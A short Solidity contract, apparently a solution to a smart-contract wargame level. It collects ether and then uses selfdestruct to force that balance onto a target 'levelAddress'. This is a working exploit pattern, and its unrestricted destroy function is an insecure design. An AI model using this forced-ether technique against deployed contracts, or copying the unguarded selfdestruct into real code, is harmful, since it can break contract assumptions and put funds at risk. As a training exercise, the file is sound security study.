// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract yesMeow{
    address owner;
    receive() external payable{
        owner=msg.sender;
    }

    function boomGoesTheContract(address payable levelAddress) public{
        selfdestruct(levelAddress);
    }   
}
